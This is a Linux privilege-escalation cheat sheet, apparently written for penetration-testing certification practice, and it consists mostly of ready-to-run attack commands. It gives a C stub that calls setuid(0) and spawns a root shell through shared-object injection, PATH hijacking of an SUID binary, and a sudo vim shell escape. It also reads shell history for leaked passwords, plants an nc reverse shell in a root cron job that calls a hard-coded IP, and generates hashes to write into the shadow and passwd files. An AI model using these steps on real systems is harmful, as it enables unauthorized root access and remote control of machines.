- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/blog/a-guide-to-linux-privilege-escalation/

- ##### Find the binaries exploit: https://gtfobins.github.io/
### Enumeration

LinEnum.sh: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

bash version 
```
/bin/bash --version
```

using -p so permissions are preserved (gain root shell)
```
/bin/bash -p 
```
#### List commands that can be used 
```
sudo -l 
```
search for the program names here 
```
https://gtfobins.github.io/
```

###### History of commands (to check accidentally typed password  )
```
cat ~/.*history | less
```

#### SO Injection

C code to provoke root shell (later should be compiled to so)
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}

```

Trace the file execution and grep the output (so injection)
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Compile the c code to so
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

##### Find SUID/SGID Files
```
find / -perm -u=s -type f 2>/dev/null
```
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

##### PATH EV alteration for SUID binary file
Here the SUID binary is executing the ls command when the SUID binary is executed 
```
echo "/bin/bash" > /tmp/ls;
chmod +x /tmp/ls;
export PATH=/tmp:$PATH
```

##### NOPASSWD for VIM/VI
```
sudo vim -c '!/bin/bash'
```
OR
```
sudo vim
```
```
:!/bin/bash
```

##### Root CronJob in /etc/crontab
in cronjob file to invoke nc reverse shell
```
mkfifo /tmp/wtgw; nc 10.17.3.231 8888 0</tmp/wtgw | /bin/sh >/tmp/wtgw 2>&1; rm /tmp/wtgw
```

##### LinEnum Tool 
Link 
```
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
```

##### Password makers
for shadow file
```
mkpasswd -m sha-512 password
```
for passwd file
```
openssl passwd password 
```